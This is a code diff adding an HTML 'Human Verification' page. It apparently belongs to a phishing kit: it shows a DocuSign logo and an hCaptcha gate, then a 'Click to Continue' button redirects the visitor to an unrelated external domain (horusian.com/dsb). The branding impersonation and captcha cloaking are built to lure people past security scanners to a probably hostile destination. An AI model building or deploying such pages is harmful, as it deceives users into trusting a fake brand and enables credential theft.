@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Human Verification</title>
+  <script src="https://hcaptcha.com/1/api.js" async defer></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Helvetica, Arial, sans-serif;
+      background: #FFFFFF;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: #fff;
+      border-radius: 14px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, .07);
+      padding: 56px 52px 44px;
+      width: 500px;
+      max-width: 94vw;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 700;
+      color: #111;
+      letter-spacing: -0.3px;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: #666;
+      line-height: 1.4;
+      margin-bottom: 36px;
+    }
+
+    .status-bar {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      background: #f4f4f5;
+      border: 1px solid #e8e8e8;
+      border-radius: 8px;
+      padding: 16px 24px;
+      margin-bottom: 28px;
+      font-size: 15px;
+      color: #444;
+    }
+
+    .captcha-wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    #loading-placeholder {
+      font-size: 14px;
+      color: #888;
+      padding: 18px 0;
+    }
+    #loading-placeholder.hidden { display: none; }
+
+    .continue-btn {
+      display: none;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 16px 24px;
+      margin-top: 24px;
+      background: #0074d9;
+      color: #fff;
+      font-size: 17px;
+      font-weight: 600;
+      font-family: inherit;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .continue-btn:hover { background: #0063b8; }
+    .continue-btn.show { display: flex; }
+
+    .btn-check {
+      width: 20px;
+      height: 20px;
+      background: #22c55e;
+      border-radius: 3px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .status-msg {
+      display: none;
+      align-items: center;
+      justify-content: center;
+      width: 100%;
+      padding: 18px 24px;
+      margin-top: 24px;
+      font-size: 15px;
+      font-weight: 500;
+      border-radius: 8px;
+      background: #fde8e8;
+      color: #c81e1e;
+    }
+    .status-msg.show { display: flex; }
+
+    .footer {
+      margin-top: 52px;
+      font-size: 12px;
+      color: #b0b0b0;
+    }
+    .footer a { color: #b0b0b0; text-decoration: underline; }
+
+    .info-btn {
+      position: fixed;
+      left: 16px;
+      bottom: 16px;
+      width: 22px;
+      height: 22px;
+      border-radius: 50%;
+      border: 1.5px solid #c8c4bf;
+      color: #c8c4bf;
+      font-size: 13px;
+      font-style: italic;
+      font-family: Georgia, serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">
+      <img src="https://docucdn-a.akamaihd.net/olive/images/2.62.0/global-assets/email-templates/email-logo.png" alt="" width="116">
+      <span></span><span></span>
+      <span></span><span></span>
+    </div>
+
+    <h1></h1>
+    <p class="subtitle">Verify you are human by completing the action below.</p>
+
+    <div class="status-bar">
+      <svg width="16" height="16" viewBox="0 0 16 16" fill="none" aria-hidden="true">
+        <rect x="3" y="7" width="10" height="8" rx="1.5" fill="#e8a317"/>
+        <path d="M5 7V5a3 3 0 0 1 6 0v2" stroke="#e8a317" stroke-width="1.6" fill="none"/>
+        <circle cx="8" cy="11" r="1.2" fill="#fff"/>
+      </svg>
+      Verifying Access
+    </div>
+
+    <div class="captcha-wrap">
+      <div id="loading-placeholder">Loading verification...</div>
+      <div class="h-captcha"
+           data-sitekey="338af34c-7bcb-4c7c-900b-acbec73d7d43"
+           data-callback="onVerify"
+           data-error-callback="onError"
+           data-expired-callback="onExpire">
+      </div>
+    </div>
+
+    <button class="continue-btn" id="continueBtn" type="button">
+      <span class="btn-check">
+        <svg width="12" height="12" viewBox="0 0 12 12" fill="none" aria-hidden="true">
+          <path d="M2 6.2L4.8 9L10 3" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </span>
+      Click to Continue
+    </button>
+
+    <div class="status-msg" id="errorMessage"></div>
+
+    <p class="footer">
+      Protected by hCaptcha &middot;
+      <a href="https://www.hcaptcha.com/privacy" target="_blank">Privacy</a> &middot;
+      <a href="https://www.hcaptcha.com/terms" target="_blank">Terms</a>
+    </p>
+  </div>
+
+  <a class="info-btn" href="https://www.hcaptcha.com/" target="_blank" title="About this page">i</a>
+
+  <script>
+    let REDIRECT_URL = "https://horusian.com/dsb";
+
+    const continueBtn = document.getElementById("continueBtn");
+    const errorEl = document.getElementById("errorMessage");
+    const placeholder = document.getElementById("loading-placeholder");
+    const widget = document.querySelector(".h-captcha");
+
+    function showError(msg) {
+      errorEl.textContent = msg;
+      errorEl.classList.add("show");
+    }
+
+    function hideError() {
+      errorEl.textContent = "";
+      errorEl.classList.remove("show");
+    }
+
+    function onVerify() {
+      continueBtn.classList.add("show");
+      hideError();
+    }
+
+    function onError() {
+      continueBtn.classList.remove("show");
+      showError("⚠️ Verification failed. Please try again.");
+    }
+
+    function onExpire() {
+      continueBtn.classList.remove("show");
+      showError("⏳ Verification expired. Please complete the captcha again.");
+    }
+
+    continueBtn.addEventListener("click", function () {
+      window.location.href = REDIRECT_URL;
+    });
+
+    const observer = new MutationObserver(function () {
+      if (widget.querySelector("iframe")) {
+        placeholder.classList.add("hidden");
+        observer.disconnect();
+      }
+    });
+    observer.observe(widget, { childList: true, subtree: true });
+
+    setTimeout(function () {
+      if (!widget.querySelector("iframe")) {
+        placeholder.classList.add("hidden");
+        showError("⚠️ Could not load verification. Please refresh the page.");
+      }
+    }, 8000);
+  </script>
+</body>
+</html>
